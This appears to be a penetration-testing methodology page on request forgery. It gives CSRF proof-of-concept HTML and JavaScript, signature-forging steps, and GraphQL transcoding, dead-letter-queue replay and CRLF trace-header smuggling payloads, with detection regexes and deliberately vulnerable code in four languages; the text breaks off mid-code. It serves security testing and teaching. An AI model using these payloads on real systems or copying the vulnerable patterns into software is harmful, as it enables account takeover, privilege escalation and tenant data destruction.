# Ability to Forge Requests

## Check List

## Methodology

### Black Box

#### Missing CSRF Protection on Sensitive Action

{% stepper %}
{% step %}
Login to your account normally
{% endstep %}

{% step %}
Intercept a sensitive request (example: email change)

```http
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com
```
{% endstep %}

{% step %}
Check whether the request contains a CSRF token, If no anti-CSRF parameter exists in body or headers, protection may be missing
{% endstep %}

{% step %}
Copy the exact request and remove the Origin and Referer headersh, Resend the request via Burp Repeater
{% endstep %}

{% step %}
If the server processes the request successfully without validating Origin/Referer, CSRF validation is absent
{% endstep %}

{% step %}
Create a malicious HTML PoC

```html
<html>
<body>
<form action="https://target.com/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@test.com">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the PoC on an external domain and open it while logged in
{% endstep %}

{% step %}
If the email is changed without user interaction or CSRF token validation, forged request is confirmed
{% endstep %}
{% endstepper %}

***

#### CSRF Token Not Bound to Session

{% stepper %}
{% step %}
Login and capture a sensitive request containing CSRF token

```http
POST /account/change-password HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

password=NewPass123&csrf=xyz987
```
{% endstep %}

{% step %}
Logout and login again to obtain a new session then Replay the old request with the old CSRF token
{% endstep %}

{% step %}
If the request succeeds with an old or reused CSRF token, token is not session-bound
{% endstep %}

{% step %}
Share the token with another authenticated account and attempt replay
{% endstep %}

{% step %}
If token works across accounts, token binding is broken
{% endstep %}

{% step %}
If reused CSRF tokens allow state-changing actions, forged request vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### JSON API Without CSRF Protection

{% stepper %}
{% step %}
Login and intercept an API request

```http
POST /api/profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"phone":"9999999999"}
```
{% endstep %}

{% step %}
Verify absence of CSRF token in headers or body
{% endstep %}

{% step %}
Create malicious JavaScript PoC

```js
<script>
fetch("https://target.com/api/profile/update",{
  method:"POST",
  credentials:"include",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({"phone":"9999999999"})
});
</script>
```
{% endstep %}

{% step %}
Host the PoC externally and open it while authenticated
{% endstep %}

{% step %}
If the API updates the profile without CSRF validation, forged JSON request is confirmed
{% endstep %}
{% endstepper %}

***

#### Predictable Request Signature

{% stepper %}
{% step %}
Intercept a signed request

```http
POST /api/transfer HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token
Content-Type: application/json

{"amount":100,"to":"user2","signature":"b64hash"}
```
{% endstep %}

{% step %}
Inspect client-side JavaScript for signature generation
{% endstep %}

{% step %}
Identify weak logic (signature = Base64(amount + to))
{% endstep %}

{% step %}
Modify amount value

```json
{"amount":10000,"to":"user2","signature":"new_b64hash"}
```
{% endstep %}

{% step %}
Recalculate signature using same weak logic then Send modified request
{% endstep %}

{% step %}
If server accepts manipulated signed request, signature validation is predictable
{% endstep %}

{% step %}
If sensitive transaction can be modified by recomputing client-side signature, forged request vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Mutation Forgery via Protocol Transcoding Asymmetry in GraphQL Edge Caching

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise GraphQL APIs situated behind global Content Delivery Networks (CDNs) or Edge Caching Proxies (e.g., Apollo Router, Varnish, Fastly)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway's protocol translation middleware
{% endstep %}

{% step %}
Identify the "GraphQL Edge Caching" architecture. By default, GraphQL utilizes HTTP `POST` requests, which CDNs typically refuse to cache. To achieve massive scalability for public data (e.g., product catalogs, global navigation), the architecture allows clients to submit GraphQL queries via HTTP `GET` requests (e.g., `GET /graphql?query={products{id}}`)
{% endstep %}

{% step %}
Investigate the downstream routing bottleneck. Internal GraphQL engines (e.g., HotChocolate, GraphQL-Java) are heavily optimized to parse JSON bodies from `POST` requests. Modifying every internal microservice to cleanly support `GET` parameters introduces massive technical debt
{% endstep %}

{% step %}
Discover the "Protocol Transcoding" optimization. The API Gateway acts as a translation layer. It intercepts the incoming `GET` request, extracts the `query` and `variables` from the URL parameters, validates them against an allowed-list (Persisted Queries) to ensure they are strictly read-only, and dynamically transcodes the request into an HTTP `POST` JSON body before forwarding it to the internal mesh
{% endstep %}

{% step %}
Analyze the HTTP specification constraint. RFC 7231 does not explicitly forbid HTTP `GET` requests from containing a message body; it merely states the payload has no defined semantics
{% endstep %}

{% step %}
Understand the architectural blind spot: The Gateway engineers assume that `GET` requests strictly consist of URL parameters. The transcoder extracts the URL parameters, but when constructing the outbound `POST` request, it utilizes a generic stream-copy or deep-merge utility that inadvertently includes the incoming `GET` request's body into the outgoing `POST` body
{% endstep %}

{% step %}
Formulate the Transcoding Forgery payload. Identify a highly privileged GraphQL mutation that you are not authorized to execute via standard `POST` requests (e.g., `mutation { makeAdmin(userId: 123) }`)
{% endstep %}

{% step %}
Construct an HTTP `GET` request. In the URL parameters, supply a completely benign, read-only query that perfectly bypasses the Gateway's Persisted Query validation or WAF rules
{% endstep %}

{% step %}
In the same HTTP `GET` request, append a JSON body containing your malicious GraphQL mutation
{% endstep %}

{% step %}
Transmit the payload to the API Gateway
{% endstep %}

{% step %}
The Gateway validates the URL query string. Because the URL query is benign, the Gateway authorizes the request
{% endstep %}

{% step %}
The Gateway initiates the protocol transcode. It creates a new `POST` request, attaches the validated URL parameters, but subsequently merges or pipes the raw HTTP body from your `GET` request into the new JSON envelope
{% endstep %}

{% step %}
The internal GraphQL engine receives the `POST` request. Due to JSON parser "Last-Key-Wins" behavior or body-over-URL prioritization, the engine discards the benign query and executes the malicious mutation, allowing the attacker to successfully forge unauthorized state-changing requests through a strictly read-only caching pipeline

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:var\s+\w+\s*=\s*new\s*\{\s*query\s*=\s*request\.Query\[\s*"query"\s*\]|request\.Query\[\s*"query"\s*\])
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:ObjectNode\s+\w+\s*=\s*mapper\.createObjectNode\(\)\s*;\s*\w+\.put\(\s*"query"\s*,\s*request\.getParameter|request\.getParameter\s*\(\s*"query"\s*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$payload\[\s*['"]query['"]\s*\]\s*=\s*\$request->query\s*\(\s*['"]query['"]\s*\)|\$request->query\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:let\s+\w+\s*=\s*\{\s*query\s*:\s*req\.query\.query\s*\}\s*;\s*Object\.assign\s*\(\s*\w+\s*,\s*req\.body\s*\)|req\.query\.query)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
var\s+postBody\s*=\s*new\s*\{\s*query\s*=\s*request\.Query\["query"\]
```
{% endtab %}

{% tab title="Java" %}
```regexp
ObjectNode\s+payload\s*=\s*mapper\.createObjectNode\(\);\s*payload\.put\("query",\s*request\.getParameter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$payload\['query'\]\s*=\s*\$request->query\('query'\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
let\s+postBody\s*=\s*\{\s*query:\s*req\.query\.query\s*\};\s*Object\.assign\(postBody,\s*req\.body\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class GraphQlGetToPostTranscoderMiddleware
{
    private readonly HttpClient _internalClient;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next)
    {
        // [1]
        // [2]
        if (context.Request.Method == "GET" && context.Request.Path == "/graphql")
        {
            var queryString = context.Request.Query["query"].ToString();

            // [3]
            if (!IsSafeReadOnlyQuery(queryString)) 
            {
                context.Response.StatusCode = 403;
                return;
            }

            // [4]
            var postBody = new JObject
            {
                ["query"] = queryString
            };

            // Fatal Optimization: Blindly merges the incoming GET body to support edge-case variables
            if (context.Request.ContentLength > 0)
            {
                using var reader = new StreamReader(context.Request.Body);
                var rawBody = await reader.ReadToEndAsync();
                var bodyJson = JObject.Parse(rawBody);
                
                postBody.Merge(bodyJson, new JsonMergeSettings { MergeArrayHandling = MergeArrayHandling.Replace });
            }

            var content = new StringContent(postBody.ToString(), Encoding.UTF8, "application/json");
            var response = await _internalClient.PostAsync("http://internal-graphql-engine", content);
            
            await response.Content.CopyToAsync(context.Response.Body);
            return;
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class GraphQlTranscodingFilter implements GlobalFilter {

    @Autowired
    private RestTemplate internalClient;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();

        // [1]
        // [2]
        if (request.getMethod() == HttpMethod.GET && request.getURI().getPath().equals("/graphql")) {
            String queryParam = request.getQueryParams().getFirst("query");

            // [3]
            if (!isSafeReadOnlyQuery(queryParam)) {
                exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);
                return exchange.getResponse().setComplete();
            }

            return DataBufferUtils.join(request.getBody()).flatMap(dataBuffer -> {
                ObjectMapper mapper = new ObjectMapper();
                ObjectNode postBody = mapper.createObjectNode();
                postBody.put("query", queryParam);

                // [4]
                // Transcoder assumes GET bodies only contain harmless 'variables'
                if (dataBuffer.readableByteCount() > 0) {
                    try {
                        byte[] bytes = new byte[dataBuffer.readableByteCount()];
                        dataBuffer.read(bytes);
                        JsonNode bodyJson = mapper.readTree(bytes);
                        
                        // ObjectReader.updateValue acts as a deep merge, overwriting the 'query' key
                        mapper.readerForUpdating(postBody).readValue(bodyJson);
                    } catch (Exception e) { }
                }

                HttpEntity<String> entity = new HttpEntity<>(postBody.toString());
                ResponseEntity<String> response = internalClient.postForEntity("http://internal-graphql-engine", entity, String.class);
                
                // Response writing logic omitted
                return Mono.empty();
            });
        }
        return chain.filter(exchange);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class GraphQlTranscodingMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        // [1]
        // [2]
        if ($request->isMethod('GET') && $request->path() === 'graphql') {
            $queryString = $request->query('query');

            // [3]
            if (!$this->isSafeReadOnlyQuery($queryString)) {
                return response('Forbidden', 403);
            }

            // [4]
            // PHP natively parses JSON bodies even on GET requests if Content-Type is set
            $postBody = ['query' => $queryString];
            $requestBody = $request->json()->all();

            // array_merge overwrites the 'query' key if the attacker provided it in the body
            $finalPayload = array_merge($postBody, $requestBody);

            $response = Http::post('http://internal-graphql-engine', $finalPayload);

            return response($response->body(), $response->status());
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class GraphQlTranscodingMiddleware {
    static async handle(req, res, next) {
        // [1]
        // [2]
        if (req.method === 'GET' && req.path === '/graphql') {
            let queryString = req.query.query;

            // [3]
            if (!isSafeReadOnlyQuery(queryString)) {
                return res.status(403).send('Forbidden');
            }

            // [4]
            let postBody = { query: queryString };

            // Express body-parser processes GET bodies perfectly fine
            if (req.body && Object.keys(req.body).length > 0) {
                // Object.assign overrides properties from right to left
                Object.assign(postBody, req.body);
            }

            let response = await axios.post('http://internal-graphql-engine', postBody);
            return res.status(response.status).json(response.data);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on edge caching to scale GraphQL performance, converting `GET` requests into internal `POST` payloads, \[2] The middleware strictly intercepts `GET` requests to apply specific Persisted Query validation rules designed exclusively for public, read-only traffic, \[3] The gateway effectively sanitizes the query parameter, confirming that it matches a known, harmless GraphQL Abstract Syntax Tree (AST), \[4] The execution sink. Developers universally assume that `GET` requests lack meaningful message bodies. To ensure complex variables or metadata from edge-cases are preserved, the transcoder merges the incoming HTTP body into the synthesized `POST` payload. Because JSON merge utilities (like `Object.assign` or `array_merge`) overwrite existing keys, the attacker's body payload completely obliterates the validated URL parameter. The gateway blindly forwards the forged, unvalidated mutation into the internal network

```http
// 1. Attacker identifies a read-only query that passes the API Gateway's validation.
// e.g., query { getPublicProducts { id name } }

// 2. Attacker crafts an HTTP GET request containing the safe query in the URL parameters.
// 3. Attacker injects a JSON body into the GET request, targeting an internal administrative mutation.

GET /graphql?query=query%20%7B%20getPublicProducts%20%7B%20id%20name%20%7D%20%7D HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json
Content-Length: 76

{
  "query": "mutation { makeAdmin(userId: 991) { success } }"
}

// 4. The Edge Transcoder extracts the URL parameter. It evaluates `query { getPublicProducts... }`.
// 5. The Transcoder approves the request because it is a safe, read-only operation.
// 6. The Transcoder synthesizes the POST request:
//    let postBody = { query: "query { getPublicProducts... }" };
// 7. The Transcoder merges the HTTP body into the payload:
//    Object.assign(postBody, req.body);
// 8. The `query` key is overwritten. The outbound payload becomes:
//    {"query": "mutation { makeAdmin(userId: 991) { success } }"}

// 9. The internal GraphQL engine receives the POST request and executes the forged mutation.
```
{% endstep %}

{% step %}
To bridge the protocol dissonance between Edge CDNs and internal GraphQL engines, architects deployed a protocol transcoding middleware. This optimization relied on the implicit structural assumption that HTTP `GET` requests are devoid of message bodies. By validating the URL parameters in isolation and subsequently merging the raw HTTP body into the outbound `POST` envelope, developers created an asymmetric evaluation pipeline. The attacker bypassed the authorization gateway by supplying a benign, decoy query in the URL, satisfying the read-only validation filters. Simultaneously, the attacker smuggled the true, state-mutating payload inside the unexpected HTTP body. The transcoding engine's native JSON merge behavior overwrote the validated payload with the malicious payload prior to internal dispatch. This allowed the attacker to successfully forge arbitrary, unauthenticated internal requests utilizing the Gateway's own highly privileged proxy identity
{% endstep %}
{% endstepper %}

***

#### Internal Request Forgery via Automated Dead-Letter Queue (DLQ) Replay Orchestration

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous, event-driven architectures involving webhooks, bulk processing, or background task queues (e.g., RabbitMQ, Kafka, Azure Service Bus)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Zero Data Loss" architecture. When a background consumer fails to process a message (e.g., due to a temporary database outage or 503 from a downstream service), it retries the message 3 times. If it still fails, the message is routed to a Dead-Letter Queue (DLQ)
{% endstep %}

{% step %}
Investigate the DLQ Replay Pipeline. Managing DLQs manually requires massive operational overhead. To solve this, platform engineers deploy an "Automated DLQ Replayer" microservice. This service periodically drains the DLQ and forwards the raw payloads directly into the internal microservices via HTTP `POST` to re-attempt processing
{% endstep %}

{% step %}
Analyze the authentication context of the Replayer. The DLQ Replayer sits deep within the internal cluster. Because it assumes that all messages in the DLQ were originally validated and authenticated by the API Gateway before they entered the primary queue, the Replayer signs its outbound HTTP requests with a highly privileged, internal `SystemAdmin` or `Service-to-Service` JWT
{% endstep %}

{% step %}
Discover the authorization assumption: The engineers assume that _only_ authorized requests can enter the DLQ. They fail to distinguish between a message that failed due to a temporary infrastructure outage (503) and a message that failed because the consumer intentionally rejected it due to a business logic violation (400/403)
{% endstep %}

{% step %}
Understand the Request Forgery vector: If you can force a malicious, unauthorized payload to fail inside the background consumer and enter the DLQ, the Replayer will eventually pick it up and blast it into the internal network with root-level privileges
{% endstep %}

{% step %}
Formulate the DLQ Forgery payload. Identify a public, asynchronous webhook ingestion endpoint (e.g., `POST /api/v1/events/ingest`)
{% endstep %}

{% step %}
Construct a payload structurally matching an administrative action (e.g., `{"action": "WIPE_TENANT", "targetId": "VICTIM_ORG"}`)
{% endstep %}

{% step %}
Submit the payload to the public endpoint. The API Gateway validates your basic identity (you are a standard user) and pushes the event to the primary queue
{% endstep %}

{% step %}
The background consumer pulls your message. It parses the JSON, recognizes the `WIPE_TENANT` command, evaluates your standard user permissions, and explicitly rejects the action, throwing an `UnauthorizedException`
{% endstep %}

{% step %}
Trigger the failure threshold. Depending on the consumer's configuration, throwing an exception forces the message back onto the queue. After 3 retries, the broker forcefully routes your malicious payload envelope to the DLQ
{% endstep %}

{% step %}
Wait for the asynchronous DLQ Replayer to execute its scheduled run
{% endstep %}

{% step %}
The DLQ Replayer extracts your raw, malicious payload. It constructs a new HTTP `POST` request, attaches its internal `SystemAdmin` token, and dispatches the request directly to the internal administrative microservice. The internal service verifies the `SystemAdmin` token and executes the forged request, granting you catastrophic privilege escalation entirely out-of-band

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:await\s+_internalClient\.PostAsync\s*\([^,]+,\s*new\s+StringContent\s*\(\s*dlqMessage\.Body|dlqMessage\.Body|DeadLetter.*PostAsync)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:restTemplate\.postForEntity\s*\([^)]*dlqMessage\.getPayload\s*\(\s*\)|dlqMessage\.getPayload\s*\(\s*\)|DeadLetter.*postForEntity)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Http::withToken\s*\(\s*['"]System['"]\s*\)->post\s*\([^,]+,\s*\$dlqMessage->body|withToken\s*\(\s*['"]System['"])
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:axios\.post\s*\([^,]+,\s*dlqMessage\.content\.toString\s*\(\s*\)|Authorization['"]\s*:\s*['"]Bearer\s+System|dlqMessage\.content)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
await\s+_internalClient\.PostAsync\([^,]+,\s*new\s*StringContent\(dlqMessage\.Body
```
{% endtab %}

{% tab title="Java" %}
```regexp
restTemplate\.postForEntity\(.*dlqMessage\.getPayload\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Http::withToken\('System'\)->post\(.*\$dlqMessage->body\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
axios\.post\(.*dlqMessage\.content\.toString\(\),\s*\{\s*headers:\s*\{\s*'Authorization':\s*'Bearer\s+System'
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class DlqReplayWorker : BackgroundService
{
    private readonly HttpClient _internalSystemClient;
    private readonly IMessageBroker _broker;

    public DlqReplayWorker(IHttpClientFactory httpClientFactory)
    {
        // Client pre-configured with internal mesh certificates and SystemAdmin tokens
        _internalSystemClient = httpClientFactory.CreateClient("InternalSystemClient");
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            var messages = await _broker.ReceiveFromDlqAsync(batchSize: 50);

            foreach (var msg in messages)
            {
                // [1]
                // [2]
                var targetUrl = msg.Headers["x-original-target"];
                var content = new StringContent(msg.Body, Encoding.UTF8, "application/json");

                // [3]
                // [4]
                // Forges the request directly into the internal network
                var response = await _internalSystemClient.PostAsync(targetUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    await _broker.AcknowledgeAsync(msg.Id);
                }
            }
            await Task.Delay(TimeSpan.FromMinutes(5), stoppingToken);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class DlqReplayWorker {

    @Autowired
    private RestTemplate internalAdminClient;
    
    @Autowired
    private QueueClient rabbitMq;

    @Scheduled(fixedDelay = 300000) // Runs every 5 minutes
    public void replayFailedMessages() {
        List<Message> dlqMessages = rabbitMq.drainQueue("primary-dlq");

        for (Message msg : dlqMessages) {
            // [1]
            // [2]
            String targetInternalUrl = msg.getMessageProperties().getHeader("X-Original-Target-Url");
            String rawPayload = new String(msg.getBody(), StandardCharsets.UTF_8);

            // [3]
            // [4]
            // Replayer assumes DLQ payloads are inherently trusted because they passed the API Gateway.
            // It utilizes a RestTemplate pre-configured with a System-to-System JWT interceptor.
            try {
                HttpHeaders headers = new HttpHeaders();
                headers.setContentType(MediaType.APPLICATION_JSON);
                HttpEntity<String> entity = new HttpEntity<>(rawPayload, headers);

                internalAdminClient.postForEntity(targetInternalUrl, entity, String.class);
                
                rabbitMq.ack(msg.getMessageProperties().getDeliveryTag());
            } catch (Exception e) {
                // Log permanent failure
            }
        }
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class DlqReplayWorker
{
    public static function replayMessages()
    {
        $messages = RabbitMq::consume('primary-dlq', 50);

        foreach ($messages as $msg) {

            // [1]
            // [2]
            $targetUrl = $msg->properties['headers']['x-original-target'];

            $rawPayload = $msg->content;


            // [3]
            // [4]
            // Blindly blasts the payload into the internal mesh using the worker's root identity

            try {

                Http::withHeaders([
                    'Content-Type' => 'application/json',
                    'Authorization' => 'Bearer ' . $GLOBALS['internalSystemToken']
                ])
                ->post($targetUrl, $rawPayload);


                RabbitMq::ack($msg);


            } catch (\Exception $err) {

                // Log and discard
                error_log($err->getMessage());
            }
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class DlqReplayWorker {
    static async replayMessages() {
        let messages = await rabbitMq.consume('primary-dlq', 50);

        for (let msg of messages) {
            // [1]
            // [2]
            let targetUrl = msg.properties.headers['x-original-target'];
            let rawPayload = msg.content.toString('utf8');

            // [3]
            // [4]
            // Blindly blasts the payload into the internal mesh using the worker's root identity
            try {
                await axios.post(targetUrl, rawPayload, {
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${internalSystemToken}`
                    }
                });
                
                await rabbitMq.ack(msg);
            } catch (err) {
                // Log and discard
            }
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies heavily on asynchronous processing. To ensure high availability and prevent data loss during transient network partitions, failed messages are routed to a Dead-Letter Queue, \[2] To eliminate manual intervention, Platform Engineers deployed a cron-based Replay Worker that systematically drains the DLQ and re-attempts the processing internally, \[3] The architecture fundamentally misunderstands the provenance of data within the DLQ. It assumes that if a message exists in the DLQ, it was strictly authorized by the external API Gateway prior to ingestion, \[4] The execution sink. Because the background consumer naturally throws exceptions when it encounters business logic violations (e.g., unauthorized access attempts), the attacker's malicious payload is gracefully routed into the DLQ. The Replay Worker, armed with highly privileged internal authentication tokens, extracts the attacker's payload and blindly executes the HTTP `POST` request against the internal microservice. The internal microservice evaluates the Replayer's `SystemAdmin` token, authorizes the request, and executes the forged administrative action

```http
// 1. Attacker interacts with a standard, low-privilege asynchronous webhook ingestion endpoint.
// 2. Attacker crafts a payload destined to fail business logic validation, but structured to execute an administrative action.

POST /api/v1/events/async-ingest HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <standard_user_token>
Content-Type: application/json
X-Original-Target: http://internal-admin-api.svc.cluster.local/api/v1/system/purge-tenant

{
  "tenantId": "VICTIM_ORG",
  "force": true
}

// 3. The API Gateway validates the JWT, confirms the user is authenticated, and pushes the payload to RabbitMQ.
// 4. The primary background consumer pulls the message. It executes:
//    if (!user.HasAccessTo("VICTIM_ORG")) throw new UnauthorizedException();
// 5. The consumer throws the exception. RabbitMQ retries 3 times.
// 6. RabbitMQ permanently routes the message to the Dead-Letter Queue (DLQ).

// 7. Five minutes later, the automated DlqReplayWorker wakes up.
// 8. The Replayer extracts the message and the X-Original-Target header.
// 9. The Replayer synthesizes a new HTTP request, attaching its own internal JWT:

POST /api/v1/system/purge-tenant HTTP/1.1
Host: internal-admin-api.svc.cluster.local
Authorization: Bearer <INTERNAL_SYSTEM_ADMIN_TOKEN>
Content-Type: application/json

{
  "tenantId": "VICTIM_ORG",
  "force": true
}

// 10. The internal admin API receives the request, validates the INTERNAL_SYSTEM_ADMIN_TOKEN, 
// and completely wipes the victim tenant's database.
```
{% endstep %}

{% step %}
To achieve resilient, zero-data-loss event processing, architects designed an automated DLQ remediation pipeline. This pipeline operated under the fatal assumption that the Dead-Letter Queue was a sanitized repository containing only legitimate, pre-authorized transactions that had suffered from transient infrastructural failures. The developers failed to recognize that standard business logic validation (e.g., throwing `403 Forbidden` exceptions within background workers) routed inherently malicious payloads directly into the exact same DLQ. The attacker weaponized this architectural conflation by deliberately submitting a highly privileged payload designed to fail authorization within the primary consumer. Once the payload was safely deposited into the DLQ, the Replay Worker awoke, extracted the raw data, and forged an identical HTTP request to the internal mesh. Because the Replayer utilized its own root-level identity to execute the retry, the forged request effortlessly bypassed all internal RBAC controls, converting an authorized denial into a catastrophic, delayed-fuse administrative execution
{% endstep %}
{% endstepper %}

***

#### Cross-Service Forgery via Context Propagation CRLF in Distributed Tracing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on microservice architectures that enforce End-to-End Distributed Tracing (e.g., OpenTelemetry, Jaeger, Zipkin) to correlate logs across disparate system boundaries
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Context Propagation" architecture. When an external request hits the API Gateway, the Gateway extracts tracking headers (e.g., `traceparent`, `b3`, or `x-request-id`) from the user's HTTP request and explicitly injects them into the HTTP headers of all outbound requests to downstream microservices
{% endstep %}

{% step %}
Investigate the downstream HTTP client implementation. To maintain context across asynchronous boundaries (e.g., Webhook dispatchers or outbound PDF generators), the backend service utilizes an HTTP client equipped with a Tracing Interceptor
{% endstep %}

{% step %}
Analyze the Header Injection logic within the Tracing Interceptor. The interceptor pulls the trace ID from the active execution context (ThreadLocal, AsyncLocal) and dynamically concatenates it into the outbound HTTP request headers (e.g., `request.Headers.Add("traceparent", currentContext.TraceId)`)
{% endstep %}

{% step %}
Discover the fatal validation gap: The API Gateway inherently trusts the format of the incoming trace headers, assuming they are strict, mathematically generated hexadecimal strings (e.g., `00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01`). It fails to sanitize these specific headers for Carriage Return Line Feed (CRLF) injection characters (`\r\n`)
{% endstep %}

{% step %}
Understand the Request Forgery vector: If the attacker injects `\r\n` into the `traceparent` header, and the backend HTTP client utilizes a vulnerable transport layer (e.g., older versions of Node.js `http` module, custom socket writers, or outdated Guzzle/cURL implementations), the attacker can physically split the outbound HTTP request
{% endstep %}

{% step %}
Formulate the Trace-Context Smuggling payload. Identify an endpoint that forces the backend to make an outbound HTTP request (e.g., triggering a Webhook, fetching a remote Avatar URL, or generating a Link Preview)
{% endstep %}

{% step %}
Construct a malicious `traceparent` header. The payload must smoothly terminate the trace header, inject two `\r\n` characters to finalize the original HTTP request, and append a completely new, forged HTTP request destined for a local, highly classified internal service
{% endstep %}

{% step %}
Payload structure: `00-1234567890\r\n\r\nPOST /internal/admin/wipe HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 15\r\n\r\n{"force":true}\r\nDummy`&#x20;
{% endstep %}

{% step %}
Submit the benign HTTP request (e.g., updating your profile) alongside the poisoned `traceparent` header
{% endstep %}

{% step %}
The API Gateway accepts the request and propagates the poisoned trace context into the internal service mesh
{% endstep %}

{% step %}
The internal microservice executes the business logic and prepares to dispatch the outbound Webhook to the external third-party server
{% endstep %}

{% step %}
The Tracing Interceptor fires, extracting your poisoned trace ID and writing it into the raw TCP socket. The CRLF characters physically split the webhook dispatch. The underlying network infrastructure (or connection pool) transmits the original webhook, immediately followed by your forged, unauthenticated `POST` request aimed directly at the internal mesh, successfully executing Server-Side Request Forgery via passive observability data

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:request\.Headers\.Add\s*\(\s*"traceparent"\s*,\s*Activity\.Current\.Id\s*\)|Activity\.Current\.Id|traceparent)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:httpEntity\.getHeaders\(\)\.add\s*\(\s*"b3"\s*,\s*MDC\.get\s*\(\s*"b3"\s*\)\s*\)|MDC\.get\s*\(\s*"b3"|b3)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$request->withHeader\s*\(\s*['"]x-request-id['"]\s*,\s*\$context->getTraceId\s*\(\s*\)\s*\)|getTraceId\s*\(\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.setHeader\s*\(\s*['"]traceparent['"]\s*,\s*asyncContext\.traceId\s*\)|asyncContext\.traceId|traceparent)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
request\.Headers\.Add\(\"traceparent\",\s*Activity\.Current\.Id\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
httpEntity\.getHeaders\(\)\.add\(\"b3\",\s*MDC\.get\(\"b3\"\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$request->withHeader\('x-request-id',\s*\$context->getTraceId\(\)\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.setHeader\('traceparent',\s*asyncContext\.traceId\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookDispatchService
{
    private static readonly HttpClient httpClient = new HttpClient();


    public static async Task<int> Dispatch(
        string targetUrl,
        object payload)
    {

        // [1]
        // [2]
        // Extracts the distributed trace ID from the asynchronous execution context

        string currentTraceId =
            AsyncLocalStorage.GetStore()
                .Get("traceparent");


        var request = new HttpRequestMessage(
            HttpMethod.Post,
            targetUrl
        );


        // [3]
        // [4]
        // Blindly concatenates the unvalidated trace context directly into the outbound headers

        request.Headers.Add(
            "traceparent",
            currentTraceId
        );


        request.Content = new StringContent(
            JsonSerializer.Serialize(payload),
            Encoding.UTF8,
            "application/json"
        );


        HttpResponseMessage response =
            await httpClient.SendAsync(request);


        return (int)response.StatusCode;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class WebhookDispatchService {

    private static final HttpClient httpClient =
            HttpClient.newHttpClient();


    public static int dispatch(
